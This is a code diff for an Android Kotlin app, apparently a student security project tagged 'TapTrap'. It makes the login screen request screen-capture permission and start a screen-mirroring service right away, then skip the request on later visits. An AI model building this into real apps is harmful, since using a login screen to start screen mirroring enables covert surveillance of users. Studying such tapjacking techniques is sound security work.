@@ -25,6 +25,7 @@ import kotlinx.coroutines.delay
 import android.content.Context
 import android.media.projection.MediaProjectionManager
 import com.example.inf2007_mad_j1847.test.ScreenMirrorService
+import android.content.Intent
 
 @Composable
 fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) {
@@ -43,11 +44,19 @@ fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) 
             ScreenMirrorService.sResultCode = result.resultCode
             ScreenMirrorService.sResultData = result.data!!
             Log.d("TapTrap", "🎥 MediaProjection granted!")
+
+            // ✅ Start service immediately from foreground (LoginScreen is visible)
+            val mirrorIntent = Intent(context, ScreenMirrorService::class.java)
+            mirrorIntent.putExtra("resultCode", result.resultCode)
+            mirrorIntent.putExtra("resultData", result.data)
+            context.startForegroundService(mirrorIntent)
         }
     }
 
     LaunchedEffect(Unit) {
-        mediaProjectionLauncher.launch(mpm.createScreenCaptureIntent())
+        if (ScreenMirrorService.sResultData == null) {
+            mediaProjectionLauncher.launch(mpm.createScreenCaptureIntent())
+        }
         delay(3000)
 
         println("launch ENTER")
